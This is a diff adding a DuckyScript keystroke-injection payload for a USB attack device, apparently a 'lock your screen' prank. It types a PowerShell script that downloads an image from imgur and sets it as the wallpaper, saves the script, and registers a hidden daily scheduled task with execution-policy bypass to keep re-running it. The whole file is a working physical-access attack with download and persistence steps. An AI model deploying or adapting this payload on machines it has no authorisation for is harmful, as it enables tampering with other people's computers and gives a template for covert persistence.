@@ -1,0 +1,85 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING notepad.exe
+ENTER
+DELAY 500
+
+STRING $image_url = "https://i.imgur.com/nomJydI.jpg"
+ENTER
+STRING $image_path = "C:\Users\Public\Pictures\wallpaper.jpg"
+ENTER
+STRING if (!(Test-Path $image_path)) {
+ENTER
+STRING     (New-Object System.Net.WebClient).DownloadFile($image_url, $image_path)
+ENTER
+STRING     if (!(Test-Path $image_path)) {
+ENTER
+STRING         exit
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+STRING $setwallpapersrc = @"
+ENTER
+STRING     using Microsoft.Win32;
+ENTER
+STRING     using System.Runtime.InteropServices;
+ENTER
+STRING     public class wallpaper {
+ENTER
+STRING         public const int SetDesktopWallpaper = 20;
+ENTER
+STRING         public const int UpdateIniFile = 0x01;
+ENTER
+STRING         public const int SendWinIniChange = 0x02;
+ENTER
+STRING         [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+ENTER
+STRING         private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
+ENTER
+STRING         public static void SetWallpaper(string path) {
+ENTER
+STRING             RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
+ENTER
+STRING             key.SetValue(@"WallpaperStyle", "0");
+ENTER
+STRING             key.SetValue(@"TileWallpaper", "0");
+ENTER
+STRING             key.Close();
+ENTER
+STRING             SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
+ENTER
+STRING         }
+ENTER
+STRING     }
+ENTER
+STRING "@
+ENTER
+STRING Add-Type -TypeDefinition $setwallpapersrc
+ENTER
+STRING [wallpaper]::SetWallpaper($image_path)
+ENTER
+STRING exit
+ENTER
+
+
+CTRL s
+DELAY 100
+STRING C:\Users\Public\Pictures\LockYourScreen.ps1
+ENTER
+DELAY 500
+ALT F4
+
+GUI r
+DELAY 100
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING schtasks /create /tn "PleaseLockYourScreen" /SC DAILY /st 09:00:00 /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command '& C:\Users\Public\Pictures\LockYourScreen.ps1'"
+ENTER
+STRING schtasks /Run /TN "PleaseLockYourScreen"
+ENTER
+STRING exit
+ENTER
